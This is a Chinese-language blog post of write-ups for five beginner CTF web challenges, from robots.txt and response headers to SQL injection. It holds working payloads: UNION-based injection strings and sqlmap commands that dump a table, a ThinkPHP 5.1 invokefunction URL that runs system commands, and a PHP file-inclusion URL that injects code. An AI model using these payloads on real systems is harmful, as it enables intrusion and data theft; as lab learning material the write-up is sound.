---
layout:       post
title:        "Web进阶区Writeup及思路总结"
subtitle:     "Null"
date:         2020-02-23 11:10:12
author:       "NeptLiang"
header-img:   "img/home-bg.jpg"
header-mask:  0.3
catalog:      true
multilingual: true
tags:
    - Sec
    - WebSec
    - Writeup
---


# 1. Training-WWW-Robots
**题目描述**：暂无

**WP**:
> **【原理】**  
> robots.txt  
>   
> **【目的】**  
> 学习robots.txt  
>   
> **【环境】**  
> windows  
>   
> **【工具】**  
> 浏览器  
>   
> **【步骤】**  
> 输入/robots.txt  
> 然后打开fl0g.php就可以看到flag:wWwrobots  
>   
> **【总结】**  
> robots.txt是一种君子协议  

**总结**：谢谢出题人的安慰。2020.2.23.Sun

---

# 2. baby_web
**题目描述**：想想初始页面是哪个

**WP**:
> **【实验原理】**  
> web请求头中的location作用  
>   
> **【实验目的】**  
> 掌握web响应包头部常见参数  
>   
> **【实验环境】**  
> Windows  
>   
> **【实验工具】**  
> firefox  
>   
> **【实验步骤】**  
> 1. 根据提示，在url中输入index.php,发现打开的仍然还是1.php
> 2. 打开火狐浏览器的开发者模式，选择网络模块，再次请求index.php,查看返回包，可以看到location参数被设置了1.php，并且得到flag。

**总结**：index.php的响应头如下
```
Connection: Keep-Alive
Content-Length: 17
Content-Type: text/html; charset=UTF-8
Date: Sun, 23 Feb 2020 03:15:42 GMT
FLAG: flag{very_baby_web}
Keep-Alive: timeout=5, max=100
Location: 1.php
Server: Apache/2.4.38 (Debian)
X-Powered-By: PHP/7.2.21
```
页面自动跳转可能是因为设置了响应的Location头，线索可能在响应头里。2020.2.23.Sun

---

# 3. NewsCenter
**题目来源**： XCTF 4th-QCTF-2018  
**题目描述**：如题目环境报错，稍等片刻刷新即可  

**WP**:
> **目标**  
> 简单的SQL注入，读取 information_schema 元数据，然后读取flag。
sqlmap 也可解。
> 
> **环境**  
> windows
> 
> **工具**  
> sqlmap
> 
> **分析过程**
> 1. 初步探测,发现搜索框存在注入 ' union select 1,2,3 #
> 2. 获取数据库名，表名 ' and 0 union select 1,TABLE_SCHEMA,TABLE_NAME from INFORMATION_SCHEMA.COLUMNS #
> 3. 获取news 表的字段名，数据类型 ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='news'#
> 4. 获取f1agfl4gher3 字段名 数据类型 ' and 0 union select 1,column_name,data_type from information_schema.columns where table_name='secret_table'#
> 5. 得到flag ' and 0 union select 1,2,fl4g from secret_table #
> 
> sqlmap版本
> 1. 获取注入点
> sqlmap -u http://192.168.100.161:53459 --data "search=df"
> 2. 获取数据库信息
> sqlmap -u http://192.168.100.161:53459 --data "search=df" -dbs
> 3. 获取库内表信息
> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news --tables
> 4. 获取表内字段信息
> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table --columns
> 5. 获取字段内容，得到flag
> sqlmap -u http://192.168.100.161:53459 --data "search=df" -D news -T secret_table -C "fl4g" --dump

**总结**：

手动注入：
1. 单引号找注入点，闭合单引号、用#或“-- ”（两杠后须有空格）注释
2. ```order by```测字段数
3. union select ```information_schema.columns```中的```table_schema```（数据库名）和```tabel_name```（表名），前面加```and 0```清除正常查询出的内容
4. union select ```information_schema.columns```中的```column_name```和```data_type```获取指定表的字段名和数据类型
5. 查表获得flag

SQLMAP使用：
* ```-u``` 指定目标url
* ```--data``` 指定请求体数据
* ```-dbs``` 获取数据库列表
* ```-D``` 指定数据库
* ```--tables``` 获取表列表
* ```-T``` 指定表
* ```--columns``` 获取字段列表
* ```-C``` 指定字段（字段名要加双引号）
* ```--dump``` 获取指定字段的值

---


# 4. php_rce

**题目来源**：暂无  
**题目描述**：暂无

**WP**:
> **原理**  
> ThinkPHP5框架底层对控制器名过滤不严，可以通过url调用到ThinkPHP框架内部的敏感函数，进而导致getshell漏洞。
> 
> **目的**  
> 掌握框架漏洞
> 
> **环境**  
> Windows
> 
> **工具**  
> firefox
> 
> **步骤**
> 1. 根据主页提示，可以发现网页使用的是ThinkPHP框架，版本为5.1
> 2. 此版本存在getshell漏洞（百度一下poc一抓一大把）
> 3. 查找flag  
> http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=find%20/%20-name%20%22flag%22
> 4. 查看flag  
> http://192.168.100.161:54064/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat%20/flag

**总结**：奇怪的知识盲区增加了，看来php框架也得学一下；flag文件还有可能在根目录等，最好用find搜索一下

---

# 5. Web_php_include

**题目来源**：XTCTF  
**题目描述**：暂无

**WP**:
> **原理**  
> php文件包含
> 
> **目的**  
> 了解如何利用php文件包含
> 
> **环境**  
> Windows
> 
> **工具**  
> chrome
> 
> **步骤**
> 1. 审计php代码,while函数根据page参数来判断php文件是否存在，如果存在此文件，则进行文件包含。
> 2. 默认页面为http://127.0.0.1/index.php,设置为page值，可确保while为真
> 3. 利用hello参数将执行内容显示  
> ```
> http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?system(%22ls%22);?%3E
> http://192.168.100.161:50281/?page=http://127.0.0.1/index.php/?hello=%3C?show_source(%22fl4gisisish3r3.php%22);?%3E
> ```


**总结**：
1. 本题中先利用被echo的参数把要执行的PHP代码输出到当前页面上（记得带上```<?php ?>```或```<? ?>```），再用被include的参数来包含当前页面；
2. ```strstr```（判断字符串中是否包含某子串）可用大小写绕过；
3. ```file_get_contents```8行的时候可尝试```show_source```
4. include的url要包含协议
5. 可通过phpinfo查看system之类的敏感函数是否被禁用

_//未完待xu_